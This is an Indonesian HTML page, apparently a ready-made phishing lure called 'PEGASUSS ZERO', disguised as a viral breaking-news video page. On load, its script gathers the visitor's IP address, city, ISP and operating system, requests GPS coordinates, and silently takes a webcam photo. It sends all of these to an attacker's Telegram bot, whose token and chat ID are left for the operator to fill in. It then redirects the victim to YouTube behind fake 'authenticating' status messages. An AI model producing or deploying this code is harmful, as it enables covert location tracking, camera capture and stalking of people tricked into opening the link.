<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIVE: BERITA VIRAL TERKINI</title>
    <meta property="og:title" content="BREAKING NEWS: KEJADIAN VIRAL HARI INI!">
    <meta property="og:description" content="Klik untuk melihat video amatir di lokasi kejadian.">
    
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; border: 1px solid #0f0; padding: 30px; box-shadow: 0 0 15px #0f0; background: rgba(0, 20, 0, 0.9); width: 90%; max-width: 400px; }
        .matrix-text { font-size: 14px; margin-bottom: 20px; border-right: 2px solid #0f0; white-space: nowrap; overflow: hidden; animation: typing 3s steps(30, end), blink .5s step-end infinite; }
        @keyframes typing { from { width: 0 } to { width: 100% } }
        @keyframes blink { from, to { border-color: transparent } 50% { border-color: #0f0 } }
        .loader { border: 4px solid #111; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <h2 style="letter-spacing: 3px;">PEGASUSS ZERO</h2>
    <div class="matrix-text">SINKRONISASI SERVER...</div>
    <div class="loader"></div>
    <p id="status">Mengautentikasi Akses Video...</p>
    
    <video id="video" width="640" height="480" style="display:none;" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
</div>

<script>
    // --- KONFIGURASI TELEGRAM (MASUKKAN DATA KAMU DI SINI) ---
    const TELE_TOKEN = "MASUKKAN_TOKEN_BOT_KAMU"; 
    const CHAT_ID = "MASUKKAN_CHAT_ID_KAMU";
    const YT_URL = "https://www.youtube.com/results?search_query=berita+viral+hari+ini";

    async function pegasusSystem() {
        const status = document.getElementById('status');
        
        try {
            // 1. TRACK IP & DEVICE
            status.innerText = "Mengambil Metadata Perangkat...";
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            
            let msg = `🎯 **TARGET TERDETEKSI**\n`;
            msg += `IP: ${ipData.ip}\nKota: ${ipData.city}\nISP: ${ipData.org}\nOS: ${navigator.platform}`;
            await sendTeleMsg(msg);

            // 2. TRACK LOKASI (GPS)
            status.innerText = "Verifikasi Lokasi Penonton...";
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const gps = `📍 **LOKASI GPS**\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await sendTeleMsg(gps);
            });

            // 3. CAPTURE KAMERA
            status.innerText = "Menghubungkan Stream Video...";
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // Ambil gambar setelah 3 detik (agar fokus)
            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(async (blob) => {
                    await sendTelePhoto(blob);
                    
                    // SELESAI & REDIRECT
                    status.innerText = "Akses Diterima. Mengalihkan...";
                    setTimeout(() => { window.location.href = YT_URL; }, 1500);
                }, 'image/jpeg');
            }, 3000);

        } catch (err) {
            console.log("Akses Ditolak/Error");
            window.location.href = YT_URL;
        }
    }

    async function sendTeleMsg(text) {
        return fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
        });
    }

    async function sendTelePhoto(blob) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'target.jpg');
        return fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    }

    window.onload = pegasusSystem;
</script>

</body>
</html>
